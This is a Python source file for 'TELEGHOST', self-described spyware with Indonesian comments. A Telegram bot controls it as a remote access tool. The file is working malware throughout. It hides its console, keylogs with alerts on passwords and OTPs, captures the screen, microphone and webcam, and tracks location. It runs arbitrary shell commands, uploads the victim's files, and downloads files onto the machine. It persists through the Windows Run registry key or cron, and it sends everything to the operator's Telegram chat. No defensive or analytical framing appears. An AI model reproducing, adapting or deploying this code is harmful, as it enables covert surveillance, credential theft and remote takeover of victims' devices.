# ============================================================
# TELEGHOST – Spyware Telegram Edition
# Full-Featured Remote Access Tool via Telegram Bot
# Support: Windows, Linux, Termux (Android)
# ============================================================

import os
import sys
import time
import json
import subprocess
import threading
import requests
import ctypes
import shutil
from datetime import datetime
from PIL import ImageGrab
import cv2
import numpy as np
import pyaudio
import wave
import telebot

# ===== HIDE CONSOLE (WINDOWS) =====
try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass

# ============================================================
# 🔥 KONFIGURASI — GANTI DENGAN PUNYA LO
# ============================================================
BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"  # GANTI
CHAT_ID = "123456789"  # GANTI

bot = telebot.TeleBot(BOT_TOKEN)

# ============================================================
# VARIABEL GLOBAL
# ============================================================
keylog_data = ""
keylog_running = False
recording_screen = False
recording_mic = False
audio_frames = []
camera = None
last_lat, last_lon = 0.0, 0.0
screenshot_interval = 300  # 5 menit
sensitive_words = ["password", "login", "admin", "username", "email", "credit", "card", "pin", "otp", "rahasia", "kunci"]

# ============================================================
# FUNGSI KIRIM KE TELEGRAM
# ============================================================
def send_message(text):
    try:
        bot.send_message(CHAT_ID, text[:4000])
    except:
        pass

def send_photo(file_path):
    try:
        bot.send_photo(CHAT_ID, open(file_path, "rb"))
    except:
        pass

def send_video(file_path):
    try:
        bot.send_video(CHAT_ID, open(file_path, "rb"))
    except:
        pass

def send_file(file_path):
    try:
        bot.send_document(CHAT_ID, open(file_path, "rb"))
    except:
        pass

def send_audio(file_path):
    try:
        bot.send_audio(CHAT_ID, open(file_path, "rb"))
    except:
        pass

def send_location(lat, lon):
    try:
        bot.send_location(CHAT_ID, lat, lon)
    except:
        pass

# ============================================================
# 📸 SCREENSHOT
# ============================================================
def screenshot():
    try:
        img = ImageGrab.grab()
        filename = f"ss_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        img.save(filename)
        send_photo(filename)
        os.remove(filename)
        return True
    except Exception as e:
        send_message(f"❌ Screenshot gagal: {e}")
        return False

# ============================================================
# 🎥 SCREEN RECORDER
# ============================================================
def start_screen_recording(duration=10, fps=10):
    global recording_screen
    try:
        recording_screen = True
        screen_size = ImageGrab.grab().size
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        filename = f"screenrec_{datetime.now().strftime('%Y%m%d_%H%M%S')}.avi"
        out = cv2.VideoWriter(filename, fourcc, fps, screen_size)
        start_time = time.time()
        while recording_screen and (time.time() - start_time) < duration:
            img = ImageGrab.grab()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)
            time.sleep(1.0 / fps)
        out.release()
        recording_screen = False
        if os.path.exists(filename):
            send_video(filename)
            os.remove(filename)
        send_message(f"✅ Screen recording {duration} detik selesai!")
    except Exception as e:
        send_message(f"❌ Screen recorder gagal: {e}")

# ============================================================
# ⌨️ KEYLOGGER
# ============================================================
def on_press(key):
    global keylog_data
    try:
        keylog_data += str(key.char)
    except AttributeError:
        if key == key.space:
            keylog_data += " "
        elif key == key.enter:
            keylog_data += "\n"
        else:
            keylog_data += f" [{str(key)}] "
    for word in sensitive_words:
        if word in keylog_data.lower():
            send_message(f"⚠️ Target mengetik kata sensitif: '{word}' | {datetime.now().strftime('%H:%M:%S')}")
            break

def start_keylog():
    global keylog_running, keylog_data
    keylog_running = True
    keylog_data = ""
    from pynput import keyboard
    with keyboard.Listener(on_press=on_press) as listener:
        while keylog_running:
            time.sleep(1)
        listener.stop()

def stop_keylog():
    global keylog_running
    keylog_running = False

# ============================================================
# 🎙️ REKAM MIC
# ============================================================
def start_mic_recording(duration=10):
    global recording_mic, audio_frames
    try:
        recording_mic = True
        audio_frames = []
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        start_time = time.time()
        while recording_mic and (time.time() - start_time) < duration:
            data = stream.read(CHUNK)
            audio_frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        recording_mic = False
        filename = f"mic_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
        wf = wave.open(filename, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(audio_frames))
        wf.close()
        if os.path.exists(filename):
            send_audio(filename)
            os.remove(filename)
        send_message(f"✅ Rekaman mic {duration} detik selesai!")
    except Exception as e:
        send_message(f"❌ Rekam mic gagal: {e}")

# ============================================================
# 📷 KAMERA (FOTO & VIDEO)
# ============================================================
def capture_photo():
    global camera
    try:
        camera = cv2.VideoCapture(0)
        ret, frame = camera.read()
        if ret:
            filename = f"cam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            cv2.imwrite(filename, frame)
            send_photo(filename)
            os.remove(filename)
            send_message("✅ Foto kamera berhasil!")
        else:
            send_message("❌ Gagal mengakses kamera")
        camera.release()
    except Exception as e:
        send_message(f"❌ Kamera gagal: {e}")

def capture_video(duration=10):
    global camera
    try:
        camera = cv2.VideoCapture(0)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        filename = f"cam_vid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.avi"
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
        start_time = time.time()
        while time.time() - start_time < duration:
            ret, frame = camera.read()
            if ret:
                out.write(frame)
        camera.release()
        out.release()
        if os.path.exists(filename):
            send_video(filename)
            os.remove(filename)
        send_message(f"✅ Video kamera {duration} detik selesai!")
    except Exception as e:
        send_message(f"❌ Video kamera gagal: {e}")

# ============================================================
# 📍 GPS (IP GEOLOCATION)
# ============================================================
def get_gps():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        geo = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
        return geo.get('lat', 0), geo.get('lon', 0)
    except:
        return 0.0, 0.0

def send_gps():
    lat, lon = get_gps()
    if lat != 0 or lon != 0:
        send_location(lat, lon)
        send_message(f"📍 Lokasi: Lat {lat}, Lon {lon}")
    else:
        send_message("❌ Gagal mendapatkan lokasi")
    return lat, lon

# ============================================================
# 📟 EKSEKUSI PERINTAH REMOTE
# ============================================================
def execute_cmd(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=30)
        return output
    except subprocess.TimeoutExpired:
        return "⏱️ Perintah timeout (30 detik)"
    except Exception as e:
        return str(e)

# ============================================================
# 📤 UPLOAD & 📥 DOWNLOAD FILE
# ============================================================
def upload_file(path):
    if os.path.exists(path):
        try:
            send_file(path)
            send_message(f"✅ File {path} berhasil diupload!")
        except Exception as e:
            send_message(f"❌ Upload gagal: {e}")
    else:
        send_message(f"❌ File tidak ditemukan: {path}")

def download_file(url, save_path):
    try:
        r = requests.get(url, stream=True, timeout=30)
        with open(save_path, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
        send_message(f"✅ File downloaded ke {save_path}")
    except Exception as e:
        send_message(f"❌ Download gagal: {e}")

# ============================================================
# 🔔 NOTIFIKASI REAL-TIME (OTOMATIS)
# ============================================================
try:
    import psutil
    PSUTIL_AVAILABLE = True
except:
    PSUTIL_AVAILABLE = False

last_app = None
app_alerted = set()

def detect_active_app():
    global last_app, app_alerted
    if not PSUTIL_AVAILABLE:
        return
    try:
        if os.name == 'nt':
            try:
                import win32gui
                window = win32gui.GetForegroundWindow()
                app_name = win32gui.GetWindowText(window)
                if app_name and app_name != last_app:
                    last_app = app_name
                    keywords = ["chrome", "firefox", "whatsapp", "telegram", "instagram", "facebook", "outlook", "explorer", "discord", "spotify"]
                    for kw in keywords:
                        if kw.lower() in app_name.lower():
                            if app_name not in app_alerted:
                                app_alerted.add(app_name)
                                send_message(f"🔔 Target membuka: {app_name} | {datetime.now().strftime('%H:%M:%S')}")
                            break
            except:
                pass
    except:
        pass

def periodic_screenshot():
    while True:
        time.sleep(screenshot_interval)
        send_message("📸 [AUTO] Screenshot periodik...")
        screenshot()

def check_location_change():
    global last_lat, last_lon
    lat, lon = get_gps()
    if last_lat == 0 and last_lon == 0:
        last_lat, last_lon = lat, lon
        return
    if lat != 0 and lon != 0:
        distance = ((lat - last_lat)**2 + (lon - last_lon)**2)**0.5 * 111000
        if distance > 500:
            send_message(f"📍 [AUTO] Lokasi berubah! Jarak: {distance:.0f} meter")
            send_location(lat, lon)
            last_lat, last_lon = lat, lon

def detect_camera_motion():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return
        ret, frame1 = cap.read()
        if not ret:
            cap.release()
            return
        ret, frame2 = cap.read()
        if not ret:
            cap.release()
            return
        motion_detected = False
        while True:
            ret, frame2 = cap.read()
            if not ret:
                break
            diff = cv2.absdiff(frame1, frame2)
            gray = cv2.cvtColor(diff, cv2.COLOR_BGR2GRAY)
            blur = cv2.GaussianBlur(gray, (5, 5), 0)
            _, thresh = cv2.threshold(blur, 20, 255, cv2.THRESH_BINARY)
            contours, _ = cv2.findContours(thresh, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)
            for contour in contours:
                if cv2.contourArea(contour) > 5000:
                    if not motion_detected:
                        motion_detected = True
                        send_message("📷 [AUTO] Gerakan terdeteksi di kamera!")
                        capture_photo()
                    break
            frame1 = frame2
            time.sleep(2)
            motion_detected = False
        cap.release()
    except:
        pass

def detect_loud_noise():
    try:
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        import audioop
        while True:
            data = stream.read(1024)
            rms = audioop.rms(data, 2)
            if rms > 1000:
                send_message("🔊 [AUTO] Suara keras terdeteksi! (Mic)")
                threading.Thread(target=start_mic_recording, args=(5,)).start()
            time.sleep(1)
    except:
        pass

# ============================================================
# 🚀 AUTO-START (WINDOWS: Registry, LINUX/TERMUX: Cron)
# ============================================================
def auto_start():
    try:
        if os.name == 'nt':
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
                script_path = os.path.abspath(__file__)
                winreg.SetValueEx(handle, "TELEGHOST", 0, winreg.REG_SZ, f'python "{script_path}"')
                winreg.CloseKey(handle)
                send_message("✅ Auto-start Windows aktif")
            except:
                pass
        else:
            try:
                script_path = os.path.abspath(__file__)
                cron_cmd = f"@reboot python {script_path}"
                subprocess.check_output(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True)
                send_message("✅ Auto-start Linux/Termux aktif")
            except:
                pass
    except:
        pass

# ============================================================
# 🤖 TELEGRAM COMMANDS
# ============================================================
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message,
        "👻 TELEGHOST Active!\n\n"
        "📌 DAFTAR PERINTAH:\n"
        "/screenshot - Ambil layar\n"
        "/screenrec [detik] - Rekam layar (default 10s)\n"
        "/keylog_start - Mulai keylogger\n"
        "/keylog_stop - Hentikan & kirim hasil\n"
        "/mic [detik] - Rekam mic (default 10s)\n"
        "/cam_photo - Ambil foto dari kamera\n"
        "/cam_video [detik] - Rekam video (default 10s)\n"
        "/gps - Kirim lokasi\n"
        "/cmd [perintah] - Jalankan perintah sistem\n"
        "/upload [path] - Upload file dari target\n"
        "/download [url] [path] - Download file ke target\n"
        "/status - Cek status TELEGHOST"
    )

@bot.message_handler(commands=['screenshot'])
def handle_screenshot(message):
    bot.reply_to(message, "📸 Mengambil screenshot...")
    screenshot()

@bot.message_handler(commands=['screenrec'])
def handle_screenrec(message):
    duration = 10
    parts = message.text.split()
    if len(parts) > 1:
        try:
            duration = int(parts[1])
        except:
            pass
    bot.reply_to(message, f"🎥 Rekam layar {duration} detik...")
    threading.Thread(target=start_screen_recording, args=(duration, 10)).start()

@bot.message_handler(commands=['keylog_start'])
def handle_keylog_start(message):
    global keylog_thread
    if 'keylog_thread' not in globals() or not keylog_thread.is_alive():
        keylog_thread = threading.Thread(target=start_keylog)
        keylog_thread.daemon = True
        keylog_thread.start()
        bot.reply_to(message, "⌨️ Keylogger started! (Kirim /keylog_stop untuk berhenti)")
    else:
        bot.reply_to(message, "⚠️ Keylogger sudah berjalan!")

@bot.message_handler(commands=['keylog_stop'])
def handle_keylog_stop(message):
    global keylog_data
    stop_keylog()
    time.sleep(1)
    if keylog_data:
        bot.reply_to(message, f"✅ Keylog result:\n{keylog_data[:3000]}")
    else:
        bot.reply_to(message, "✅ Keylogger stopped, tidak ada data.")
    keylog_data = ""

@bot.message_handler(commands=['mic'])
def handle_mic(message):
    duration = 10
    parts = message.text.split()
    if len(parts) > 1:
        try:
            duration = int(parts[1])
        except:
            pass
    bot.reply_to(message, f"🎙️ Rekam mic {duration} detik...")
    threading.Thread(target=start_mic_recording, args=(duration,)).start()

@bot.message_handler(commands=['cam_photo'])
def handle_cam_photo(message):
    bot.reply_to(message, "📷 Mengambil foto dari kamera...")
    threading.Thread(target=capture_photo).start()

@bot.message_handler(commands=['cam_video'])
def handle_cam_video(message):
    duration = 10
    parts = message.text.split()
    if len(parts) > 1:
        try:
            duration = int(parts[1])
        except:
            pass
    bot.reply_to(message, f"🎥 Rekam video {duration} detik...")
    threading.Thread(target=capture_video, args=(duration,)).start()

@bot.message_handler(commands=['gps'])
def handle_gps(message):
    bot.reply_to(message, "📍 Mengambil lokasi...")
    threading.Thread(target=send_gps).start()

@bot.message_handler(commands=['cmd'])
def handle_cmd(message):
    cmd = message.text.replace('/cmd ', '')
    if not cmd:
        bot.reply_to(message, "❌ Masukkan perintah! Contoh: /cmd whoami")
        return
    bot.reply_to(message, f"📟 Menjalankan: {cmd}")
    output = execute_cmd(cmd)
    bot.reply_to(message, f"📟 Output:\n{output[:3900]}")

@bot.message_handler(commands=['upload'])
def handle_upload(message):
    path = message.text.replace('/upload ', '').strip()
    if not path:
        bot.reply_to(message, "❌ Masukkan path file! Contoh: /upload C:\\file.txt")
        return
    bot.reply_to(message, f"📤 Uploading {path}...")
    threading.Thread(target=upload_file, args=(path,)).start()

@bot.message_handler(commands=['download'])
def handle_download(message):
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "❌ Format: /download [url] [save_path]")
        return
    url = parts[1]
    save_path = parts[2]
    bot.reply_to(message, f"📥 Downloading dari {url} ke {save_path}...")
    threading.Thread(target=download_file, args=(url, save_path)).start()

@bot.message_handler(commands=['status'])
def handle_status(message):
    status = "✅ TELEGHOST Active!\n\n"
    status += f"📱 OS: {os.name}\n"
    status += f"🕐 Uptime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    status += f"🔐 Keylogger: {'Running' if keylog_running else 'Stopped'}\n"
    status += f"🎥 Screen Rec: {'Running' if recording_screen else 'Stopped'}\n"
    status += f"🎙️ Mic Rec: {'Running' if recording_mic else 'Stopped'}\n"
    status += f"📸 Auto Screenshot: {screenshot_interval} detik\n"
    bot.reply_to(message, status)

# ============================================================
# 🚀 MAIN
# ============================================================
if __name__ == "__main__":
    try:
        send_message("👻 TELEGHOST Active!")
        send_message("📌 Kirim /help untuk daftar perintah")
        
        auto_start()
        
        threading.Thread(target=periodic_screenshot, daemon=True).start()
        threading.Thread(target=detect_active_app, daemon=True).start()
        threading.Thread(target=check_location_change, daemon=True).start()
        threading.Thread(target=detect_camera_motion, daemon=True).start()
        threading.Thread(target=detect_loud_noise, daemon=True).start()
        
        bot.polling(none_stop=True, interval=0)
    except Exception as e:
        send_message(f"⚠️ Error: {str(e)}")
        time.sleep(5)